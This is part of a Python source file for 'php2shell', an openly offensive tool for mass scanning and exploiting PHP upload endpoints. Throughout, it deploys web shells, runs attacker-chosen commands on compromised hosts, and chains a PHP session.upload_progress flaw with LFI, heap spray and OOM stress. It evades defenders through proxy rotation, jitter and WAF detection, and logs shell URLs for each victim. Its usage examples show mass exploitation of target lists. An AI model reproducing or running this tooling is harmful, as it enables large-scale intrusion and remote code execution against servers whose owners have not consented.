def append_line_locked(path: Optional[str], line: str) -> None:
    if not path:
        return
    with _io_lock:
        with open(path, "a", encoding="utf-8") as fh:
            fh.write(line.rstrip() + "\n")
            fh.flush()


def publish_vuln_hit(result: CheckResult, output_path: Optional[str]) -> None:
    """Write vuln to disk and console as soon as it is confirmed."""
    line = (
        f"{result.target_url}\t{result.upload_endpoint or ''}\t{result.shell_url or ''}\t"
        f"{result.vector or ''}\t{result.cve_ids or ''}\t{result.patch_status or ''}\t"
        f"{result.sapi_type or ''}\t{result.oom_threshold or ''}\t{result.stale_state or ''}"
    )
    append_line_locked(output_path, line)
    with _io_lock:
        console.print(
            f"[green bold][VULN][/] {result.target_url}  "
            f"[dim]vector={result.vector or 'unknown'}[/]  "
            f"[dim]cve={result.cve_ids or '-'}[/]  "
            f"[dim]upload:[/] {result.upload_endpoint}  [dim]shell:[/] {result.shell_url}"
        )
        if result.core_detail:
            console.print(f"[dim]  core: {result.core_detail}[/]")


def mass_check_worker(base_config: PoCConfig, target_url: str) -> CheckResult:
    apply_worker_throttle(base_config)
    session = build_session(replace(base_config, quiet=True), referer_url=target_url)
    try:
        quiet_cfg = replace(base_config, quiet=True)
        vuln, shell, waf, endpoint, vector, core_detail = hybrid_vulnerability_check(
            session, quiet_cfg, target_url
        )
        cve_ids = patch_status = sapi_type = oom_threshold = stale_state = None
        if core_detail:
            for part in core_detail.split(";"):
                p = part.strip()
                if p.startswith("cve="):
                    cve_ids = p[4:]
                elif p.startswith("patch="):
                    patch_status = p[6:]
                elif p.startswith("sapi="):
                    sapi_type = p[5:]
                elif p.startswith("oom="):
                    oom_threshold = p[4:]
                elif p.startswith("stale="):
                    stale_state = p[6:]
        return CheckResult(
            target_url=target_url,
            vulnerable=vuln,
            shell_url=shell.shell_url if shell else None,
            upload_endpoint=endpoint,
            waf_blocked=waf,
            vector=vector,
            core_detail=core_detail,
            cve_ids=cve_ids,
            patch_status=patch_status,
            sapi_type=sapi_type,
            oom_threshold=oom_threshold,
            stale_state=stale_state,
        )
    except Exception:
        return CheckResult(target_url=target_url, vulnerable=False)
    finally:
        session.close()


def mass_exploit_worker(
    base_config: PoCConfig,
    target_url: str,
    command: str,
) -> ExploitResult:
    apply_worker_throttle(base_config)
    session = build_session(replace(base_config, quiet=True), referer_url=target_url)
    try:
        vuln, shell, waf, upload_endpoint, vector, _core = hybrid_vulnerability_check(
            session, base_config, target_url
        )
        if waf:
            return ExploitResult(
                target_url=target_url,
                vulnerable=False,
                command=command,
                upload_endpoint=upload_endpoint,
                waf_blocked=True,
            )
        if not vuln or shell is None:
            return ExploitResult(
                target_url=target_url,
                vulnerable=False,
                command=command,
                upload_endpoint=upload_endpoint,
            )

        if vector == "core-session-upload-progress":
            if base_config.core_chain_exploit:
                core = check_php_core_upload_progress(
                    session, replace(base_config, quiet=True), target_url, quiet=True
                )
                if core and core.vulnerable:
                    chain = run_core_chain_exploit(
                        session,
                        base_config,
                        target_url,
                        core,
                        command,
                    )
                    if chain.success:
                        return ExploitResult(
                            target_url=target_url,
                            vulnerable=True,
                            shell_url=chain.lfi_url_used or shell.shell_url,
                            command=command,
                            output=chain.output,
                            upload_endpoint=upload_endpoint,
                        )
            return ExploitResult(
                target_url=target_url,
                vulnerable=True,
                shell_url=shell.shell_url,
                command=command,
                error="core vector: use --core-chain (+ --lfi-url FUZZ) for automated chain",
                upload_endpoint=upload_endpoint,
            )

        config, _ = prepare_target_config(session, base_config, target_url)
        if not deploy_exec_shell(session, config, shell):
            return ExploitResult(
                target_url=target_url,
                vulnerable=True,
                shell_url=shell.shell_url,
                command=command,
                error="exec payload deploy failed",
                upload_endpoint=upload_endpoint,
            )

        output = execute_command(
            session, shell, command, timeout=config.timeout, config=config, quiet=True
        )
        if output is None:
            return ExploitResult(
                target_url=target_url,
                vulnerable=True,
                shell_url=shell.shell_url,
                command=command,
                error="command execution failed",
                upload_endpoint=upload_endpoint,
            )
        return ExploitResult(
            target_url=target_url,
            vulnerable=True,
            shell_url=shell.shell_url,
            command=command,
            output=output,
            upload_endpoint=upload_endpoint,
        )
    except Exception as exc:
        return ExploitResult(
            target_url=target_url,
            vulnerable=False,
            command=command,
            error=str(exc),
        )
    finally:
        session.close()


def run_pool_map(
    targets: list[str],
    threads: int,
    label: str,
    worker: Callable[[str], Any],
) -> list[Any]:
    results: list[Any] = []
    progress = Progress(
        TextColumn("[bold blue]{task.description}"),
        BarColumn(),
        MofNCompleteColumn(),
        TimeElapsedColumn(),
        console=console,
        transient=False,
    )
    with progress:
        task_id = progress.add_task(label, total=len(targets))
        with ThreadPoolExecutor(max_workers=max(1, threads)) as pool:
            future_map = {pool.submit(worker, url): url for url in targets}
            for future in as_completed(future_map):
                progress.advance(task_id)
                try:
                    results.append(future.result())
                except Exception:
                    url = future_map[future]
                    results.append(CheckResult(target_url=url, vulnerable=False))
    return results


def run_mass_check(
    base_config: PoCConfig,
    targets: list[str],
    threads: int,
    output_path: Optional[str],
) -> int:
    if output_path:
        Path(output_path).write_text(
            "original_url\tupload_endpoint\tshell_url\tvector\tcve\tpatch_status\t"
            "sapi\toom_threshold\tstale_state\n",
            encoding="utf-8",
        )
    if base_config.discovery_log and base_config.discovery_log != "-":
        Path(base_config.discovery_log).write_text(
            "original_url\tupload_endpoint\thttp_status\tpath\tfield\tsource\n",
            encoding="utf-8",
        )

    discovery_note = (
        f"Auto-discovery: [green]on[/] ({len(filter_handler_wordlist(base_config.endpoint_paths))} handlers, "
        f"{base_config.discovery_path_threads} path-threads/host)"
        if base_config.auto_discovery
        else "Auto-discovery: [yellow]off[/]"
    )
    console.print(
        Panel(
            f"[bold]Mass check[/]\nTargets: {len(targets)} | Threads: {threads}\n"
            f"Core probe: [green]{'on' if base_config.core_check_enabled else 'off'}[/] | "
            f"Strict CVE: [green]{'on' if base_config.strict_cve else 'off'}[/] | "
            f"Adaptive: [green]{'on' if base_config.core_adaptive else 'off'}[/] | "
            f"ASLR probe: [green]{'on' if base_config.core_aslr_probe else 'off'}[/] | "
            f"SAPI auto: [green]{'on' if base_config.core_sapi_auto else 'off'}[/] | "
            f"OOM fuzz: [green]{'on' if base_config.core_oom_fuzz else 'off'}[/]\n"
            f"{discovery_note}",
            border_style="cyan",
        )
    )

    hits: list[CheckResult] = []
    scan_config = replace(base_config, check_output=output_path)

    def worker(url: str) -> CheckResult:
        result = mass_check_worker(scan_config, url)
        if result.vulnerable:
            publish_vuln_hit(result, output_path)
            with _io_lock:
                hits.append(result)
        return result

    results = run_pool_map(targets, threads, "Scanning targets...", worker)

    waf_hits = 0
    for item in results:
        if isinstance(item, CheckResult) and item.waf_blocked and not item.vulnerable:
            waf_hits += 1
            with _io_lock:
                console.print(f"[bold yellow][WAF BLOCKED][/] {item.target_url}")

    if not hits:
        hits = [item for item in results if isinstance(item, CheckResult) and item.vulnerable]

    discovered_hosts = sum(
        1
        for item in results
        if isinstance(item, CheckResult)
        and item.upload_endpoint
        and item.upload_endpoint.rstrip("/") != item.target_url.rstrip("/")
    )

    table = Table(title="Mass check summary")
    table.add_column("Metric", style="cyan")
    table.add_column("Value", justify="right")
    table.add_row("Scanned", str(len(targets)))
    table.add_row("Endpoints discovered", str(discovered_hosts))
    table.add_row("Vulnerable", f"[green]{len(hits)}[/]")
    table.add_row("WAF blocked", f"[yellow]{waf_hits}[/]")
    table.add_row("Clean / failed", str(len(targets) - len(hits) - waf_hits))
    if output_path:
        table.add_row("Saved to", output_path)
    if base_config.discovery_log and base_config.discovery_log != "-":
        table.add_row("Discovery log", base_config.discovery_log)
    console.print(table)

    return 0 if hits else 1


def write_exploit_log(path: str, records: list[ExploitResult]) -> None:
    payload = [
        asdict(r)
        for r in records
        if r.waf_blocked
        or (r.vulnerable and (r.output is not None or r.error))
    ]
    if path.lower().endswith(".json"):
        with open(path, "w", encoding="utf-8") as fh:
            json.dump(payload, fh, indent=2, ensure_ascii=False)
        return
    with open(path, "w", encoding="utf-8") as fh:
        for rec in records:
            if not rec.vulnerable and not rec.waf_blocked:
                continue
            fh.write(f"=== {rec.target_url} ===\n")
            if rec.waf_blocked:
                fh.write("status: WAF BLOCKED\n")
            if rec.upload_endpoint:
                fh.write(f"upload_endpoint: {rec.upload_endpoint}\n")
            if rec.shell_url:
                fh.write(f"shell: {rec.shell_url}\n")
            if rec.command:
                fh.write(f"cmd: {rec.command}\n")
            if rec.error:
                fh.write(f"error: {rec.error}\n")
            if rec.output:
                fh.write(rec.output + "\n")
            fh.write("\n")


def run_mass_exploit(
    base_config: PoCConfig,
    targets: list[str],
    threads: int,
    command: str,
    log_path: str,
) -> int:
    if base_config.discovery_log and base_config.discovery_log != "-":
        if not Path(base_config.discovery_log).exists():
            Path(base_config.discovery_log).write_text(
                "original_url\tupload_endpoint\thttp_status\tpath\tfield\tsource\n",
                encoding="utf-8",
            )

    discovery_note = (
        f"Auto-discovery: [green]on[/] ({len(filter_handler_wordlist(base_config.endpoint_paths))} handlers)"
        if base_config.auto_discovery
        else "Auto-discovery: [yellow]off[/]"
    )
    console.print(
        Panel(
            f"[bold]Mass exploit[/]\nTargets: {len(targets)} | Threads: {threads}\n"
            f"Command: [yellow]{command}[/]\n{discovery_note}",
            border_style="red",
        )
    )

    def worker(url: str) -> ExploitResult:
        return mass_exploit_worker(base_config, url, command)

    results_raw = run_pool_map(targets, threads, "Exploiting targets...", worker)
    exploit_results = [r for r in results_raw if isinstance(r, ExploitResult)]

    waf_hits = sum(1 for r in exploit_results if r.waf_blocked)
    for rec in exploit_results:
        if rec.waf_blocked:
            with _io_lock:
                console.print(f"[bold yellow][WAF BLOCKED][/] {rec.target_url}")

    success = 0
    for rec in exploit_results:
        if not rec.vulnerable or not rec.output:
            continue
        success += 1
        with _io_lock:
            console.print(f"\n[bold green]{rec.target_url}[/]")
            if rec.upload_endpoint:
                console.print(f"[dim]upload:[/] {rec.upload_endpoint}")
            if rec.shell_url:
                console.print(f"[dim]shell:[/] {rec.shell_url}")
            console.print(rec.output)

    write_exploit_log(log_path, exploit_results)

    table = Table(title="Mass exploit summary")
    table.add_column("Metric", style="cyan")
    table.add_column("Value", justify="right")
    table.add_row("Scanned", str(len(targets)))
    table.add_row("Vulnerable", str(sum(1 for r in exploit_results if r.vulnerable)))
    table.add_row("WAF blocked", f"[yellow]{waf_hits}[/]")
    table.add_row("Command OK", f"[green]{success}[/]")
    table.add_row("Log file", log_path)
    console.print(table)

    return 0 if success else 1


def parse_form_kv(pairs: list[str]) -> dict[str, str]:
    result: dict[str, str] = {}
    for item in pairs:
        if "=" not in item:
            console.print(f"[yellow]Skipping malformed --form entry:[/] {item}")
            continue
        key, _, val = item.partition("=")
        result[key.strip()] = val.strip()
    return result


def build_parser() -> argparse.ArgumentParser:
    examples = """
Examples:
  Single target check:
    python poc.py -u http://target.com/upload.php --check

  Mass hybrid check (CVE-2026 core probe + app upload):
    python poc.py -f targets.txt --check --threads 20 --output results.txt

  Strict CVE signatures + adaptive padding (single target):
    python poc.py -u http://target/ --check --strict-cve --core-adaptive --core-aslr

  Core chain exploit (Auto-LFI + session poison; manual override optional):
    python poc.py -u http://target/ --exploit --core-chain -cmd "id"

  Manual LFI template:
    python poc.py -u http://target/ --exploit --core-chain --lfi-url "http://target/index.php?page=FUZZ" -cmd id

  App-only mass check:
    python poc.py -f targets.txt --check --no-core-check

  Custom upload path wordlist:
    python poc.py -f targets.txt --check --wordlist paths.txt --discovery-log discovered_endpoints.txt

  Mass exploit with jitter + proxy rotation:
    python poc.py -f targets.txt --exploit -cmd "id" --jitter --proxy-file proxies.txt

  Single exploit:
    python poc.py -u http://target.com/upload.php --exploit -cmd "whoami"
"""
    parser = argparse.ArgumentParser(
        prog="php2shell",
        description="PHP upload / web-shell PoC (single + mass concurrent scanning).",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=examples,
    )
    parser.add_argument("-u", "--url", dest="target_url", help="Single target upload URL")
    parser.add_argument(
        "-f",
        "--file",
        dest="target_file",
        help="File with one target URL or hostname per line",
    )
    parser.add_argument("--shell-url", help="Existing shell URL (single-target exploit only)")
    parser.add_argument("-c", "--check", action="store_true", help="Vulnerability check mode")
    parser.add_argument("--exploit", action="store_true", help="Exploit mode")
    parser.add_argument("-cmd", "--command", dest="command", help="Command for exploit mode")
    parser.add_argument("--proxy", help="HTTP/HTTPS/SOCKS proxy URL")
    parser.add_argument(
        "--proxy-file",
        help="Proxy list for rotation in mass mode (one proxy per line)",
    )
    parser.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT)
    parser.add_argument("-k", "--insecure", action="store_true", help="Disable TLS verification")
    parser.add_argument("--field", default="file", help="Multipart file field name")
    parser.add_argument(
        "--ext",
        dest="extensions",
        default=",".join(DEFAULT_EXTENSIONS),
        help="Comma-separated extensions to try",
    )
    parser.add_argument("--shell-path", help="Hint path for uploaded shell")
    parser.add_argument(
        "--form",
        action="append",
        default=[],
        metavar="KEY=VALUE",
        help="Extra POST fields (repeatable)",
    )
    parser.add_argument("--double-ext", action="store_true", help="Try double-extension filenames")
    parser.add_argument(
        "--threads",
        type=int,
        default=DEFAULT_THREADS,
        help=f"Worker threads for mass mode (default: {DEFAULT_THREADS})",
    )
    parser.add_argument(
        "--output",
        dest="check_output",
        help="Write vulnerable targets live during mass --check (default: results.txt)",
    )
    parser.add_argument(
        "--exploit-log",
        default=DEFAULT_EXPLOIT_LOG,
        help=f"Mass exploit log path (.json or .txt, default: {DEFAULT_EXPLOIT_LOG})",
    )
    parser.add_argument(
        "--delay",
        type=float,
        default=0.0,
        help="Base delay before each target worker (seconds)",
    )
    parser.add_argument(
        "--jitter",
        action="store_true",
        help="Add random delay (jitter-min..jitter-max) on top of --delay per worker",
    )
    parser.add_argument(
        "--jitter-min",
        type=float,
        default=DEFAULT_JITTER_MIN,
        help=f"Minimum random jitter seconds (default: {DEFAULT_JITTER_MIN})",
    )
    parser.add_argument(
        "--jitter-max",
        type=float,
        default=DEFAULT_JITTER_MAX,
        help=f"Maximum random jitter seconds (default: {DEFAULT_JITTER_MAX})",
    )
    parser.add_argument(
        "--wordlist",
        help="Custom upload endpoint paths (one path per line; default: built-in list)",
    )
    parser.add_argument(
        "--no-discovery",
        action="store_true",
        help="Disable auto-discovery of upload endpoints on root domains",
    )
    parser.add_argument(
        "--discovery-log",
        default=None,
        help=f"Log discovered endpoints (default in mass mode: {DEFAULT_DISCOVERY_LOG}; use '-' to disable)",
    )
    parser.add_argument(
        "--discovery-threads",
        type=int,
        default=DEFAULT_DISCOVERY_PATH_THREADS,
        help=f"Concurrent path probes per host (default: {DEFAULT_DISCOVERY_PATH_THREADS})",
    )
    parser.add_argument(
        "--no-core-check",
        action="store_true",
        help="Skip PHP core session.upload_progress pre-auth probe (app-only mode)",
    )
    parser.add_argument(
        "--core-padding",
        type=int,
        default=CORE_DEFAULT_PADDING,
        help=f"Multipart file padding bytes for core probe (default: {CORE_DEFAULT_PADDING})",
    )
    parser.add_argument(
        "--core-aggressive",
        action="store_true",
        help="Use larger core probe body (5120 bytes; may stress memory on vulnerable PHP)",
    )
    parser.add_argument(
        "--strict-cve",
        action="store_true",
        help="Require CVE-specific response signatures; skip probes when PHP version is patched",
    )
    parser.add_argument(
        "--core-adaptive",
        action="store_true",
        help="Tune multipart padding/boundary per PHP 8.1–8.5 branch (ikow-style sizing)",
    )
    parser.add_argument(
        "--core-aslr",
        action="store_true",
        help="Try heap alignment steps and backoff padding on worker crash (9bie-style probing)",
    )
    parser.add_argument(
        "--core-chain",
        action="store_true",
        help="Run automated core RCE chain on --exploit (session poison + optional LFI/FPM)",
    )
    parser.add_argument(
        "--lfi-url",
        default=None,
        help="LFI template with FUZZ for sess path (e.g. http://target/index.php?page=FUZZ)",
    )
    parser.add_argument(
        "--lfi-url-file",
        default=None,
        help="File with one LFI URL template per line (must contain FUZZ)",
    )
    parser.add_argument(
        "--core-endpoint-only",
        action="store_true",
        help="Core probe/chain only on -u path (skip /wp-login.php etc.)",
    )
    parser.add_argument(
        "--no-lfi-auto",
        action="store_true",
        help="Disable automatic LFI parameter discovery during --core-chain",
    )
    parser.add_argument(
        "--lfi-discover-max",
        type=int,
        default=DEFAULT_LFI_DISCOVER_MAX_PROBES,
        help=f"Max Auto-LFI probe requests per target (default: {DEFAULT_LFI_DISCOVER_MAX_PROBES})",
    )
    parser.add_argument(
        "--core-heap-spray",
        action="store_true",
        help="Add staggered multipart field_XX heap spray parts to core requests",
    )
    parser.add_argument(
        "--core-spray-fields",
        type=int,
        default=DEFAULT_HEAP_SPRAY_FIELDS,
        help=f"Number of heap spray fields (default: {DEFAULT_HEAP_SPRAY_FIELDS})",
    )
    parser.add_argument(
        "--core-fpm-two-step",
        action="store_true",
        help="FPM stale-worker chain: OOM stress request then upload_progress follow-up",
    )
    parser.add_argument(
        "--core-timing",
        action="store_true",
        help="Measure latency baseline vs attack POST to detect silent OOM (109618)",
    )
    parser.add_argument(
        "--core-fpm-gap",
        type=float,
        default=DEFAULT_FPM_STAGGER_SEC,
        help=f"Seconds between FPM two-step requests (default: {DEFAULT_FPM_STAGGER_SEC})",
    )
    parser.add_argument(
        "--no-core-oom-fuzz",
        action="store_true",
        help="Disable tiered 256K-8M OOM calibration loop",
    )
    parser.add_argument(
        "--no-sapi-auto",
        action="store_true",
        help="Do not auto-tune exploit strategy from detected SAPI",
    )
    parser.add_argument(
        "--core-worker-pin",
        action="store_true",
        help="Force keep-alive single-connection pool (PHP-FPM worker pinning)",
    )
    return parser


def parse_extensions(raw: str) -> tuple[str, ...]:
    exts = tuple(
        e if e.startswith(".") else f".{e}"
        for e in (part.strip() for part in raw.split(","))
        if e
    )
    return exts or DEFAULT_EXTENSIONS


def main(argv: Optional[list[str]] = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)

    if not args.check and not args.exploit:
        parser.error("Specify --check and/or --exploit")

    if args.target_url and args.target_file:
        parser.error("Use either -u/--url or -f/--file, not both")

    if not args.target_url and not args.target_file and not args.shell_url:
        parser.error("Provide -u/--url, -f/--file, or --shell-url")

    mass_mode = bool(args.target_file)

    if mass_mode:
        if args.shell_url:
            parser.error("--shell-url is only supported for single-target mode")
        if args.exploit and not args.command:
            parser.error("Mass --exploit requires -cmd/--command (interactive shell disabled)")
        if args.check is False and args.exploit is False:
            parser.error("Mass mode requires --check and/or --exploit")
    else:
        if args.check and not args.target_url and not args.shell_url:
            parser.error("--check requires -u/--url (or use -f for mass)")
        if args.exploit and not args.target_url and not args.shell_url:
            parser.error("--exploit requires -u/--url or --shell-url")

    discovery_log = args.discovery_log
    auto_discovery = not args.no_discovery
    if discovery_log is None and mass_mode and auto_discovery:
        discovery_log = DEFAULT_DISCOVERY_LOG
    if args.no_discovery:
        discovery_log = None if args.discovery_log is None else discovery_log

    probe_timeout = min(float(args.timeout), DEFAULT_DISCOVERY_PROBE_TIMEOUT)

    proxy_list = load_proxy_list(args.proxy_file, args.proxy)

    base_config = PoCConfig(
        target_url=args.target_url or "",
        proxy=args.proxy if not proxy_list else None,
        proxy_list=proxy_list,
        timeout=args.timeout,
        verify_ssl=not args.insecure,
        upload_field=args.field,
        extensions=parse_extensions(args.extensions),
        shell_path_hint=args.shell_path,
        extra_form=parse_form_kv(args.form) or None,
        double_ext_bypass=args.double_ext,
        delay=max(0.0, args.delay),
        jitter=args.jitter,
        jitter_min=args.jitter_min,
        jitter_max=args.jitter_max,
        auto_discovery=auto_discovery,
        endpoint_paths=load_endpoint_wordlist(args.wordlist),
        discovery_path_threads=max(1, args.discovery_threads),
        discovery_probe_timeout=probe_timeout,
        discovery_log=discovery_log,
        core_check_enabled=not args.no_core_check,
        core_file_padding=5120 if args.core_aggressive else max(1, args.core_padding),
        core_aggressive_oom=args.core_aggressive,
        strict_cve=args.strict_cve,
        core_adaptive=args.core_adaptive or args.core_aslr,
        core_aslr_probe=args.core_aslr,
        lfi_url=args.lfi_url,
        lfi_url_file=args.lfi_url_file,
        core_endpoint_only=args.core_endpoint_only,
        lfi_auto_discover=not args.no_lfi_auto,
        lfi_discover_max_probes=max(20, args.lfi_discover_max),
        core_chain_exploit=args.core_chain,
        core_heap_spray=args.core_heap_spray or args.core_chain,
        core_heap_spray_fields=max(1, args.core_spray_fields),
        core_fpm_two_step=args.core_fpm_two_step,
        core_timing_probe=args.core_timing,
        core_fpm_stagger_sec=max(0.02, args.core_fpm_gap),
        core_oom_fuzz=(
            not args.no_core_oom_fuzz
            and not (args.core_chain and not args.core_aggressive)
        ),
        core_sapi_auto=not args.no_sapi_auto,
        core_worker_pin=args.core_worker_pin,
    )

    if args.core_chain and not args.core_endpoint_only:
        base_config = replace(base_config, core_endpoint_only=True)
    if args.exploit and args.core_chain and not args.check:
        base_config = replace(base_config, auto_discovery=False)

    if mass_mode:
        targets = load_targets_from_file(args.target_file)
        if not targets:
            console.print("[red]No valid targets in file.[/]")
            return 1

        exit_code = 0
        if args.check:
            check_output = args.check_output
            if check_output is None:
                check_output = "results.txt"
            code = run_mass_check(base_config, targets, args.threads, check_output)
            exit_code = max(exit_code, code)

        if args.exploit:
            code = run_mass_exploit(
                base_config,
                targets,
                args.threads,
                args.command,
                args.exploit_log,
            )
            exit_code = max(exit_code, code)

        return exit_code

    config = base_config
    if args.exploit:
        stage_log(
            f"[bold]php2shell exploit[/] target={config.target_url or args.shell_url} "
            f"core_chain={'on' if config.core_chain_exploit else 'off'}"
        )

    session = build_session(config, referer_url=config.target_url or None)
    shell = ShellSession(shell_url=args.shell_url) if args.shell_url else None

    if config.target_url and config.auto_discovery and not shell:
        config, discovered = prepare_target_config(session, config, config.target_url)
        endpoint = discovered or config.target_url
        console.print(
            f"[cyan]Upload handler[/] {endpoint}  [dim]field={config.upload_field}[/]"
        )

    exit_code = 0
    if args.check:
        if args.exploit and shell:
            console.print("[yellow]--check skipped when --shell-url is set with --exploit[/]")
        else:
            vuln, _, waf, _, vector, _ = hybrid_vulnerability_check(
                session, config, config.target_url
            )
            if waf:
                exit_code = 2
            elif not vuln:
                exit_code = 1
            elif vector == "core-session-upload-progress":
                console.print(
                    "[magenta]Core pre-auth surface detected[/] — chain planner printed above; "
                    "see results TSV cve/patch_status columns."
                )

    if args.exploit:
        code = run_exploit(session, config, shell, args.command)
        exit_code = max(exit_code, code)

    session.close()
    return exit_code


if __name__ == "__main__":
    sys.exit(main())
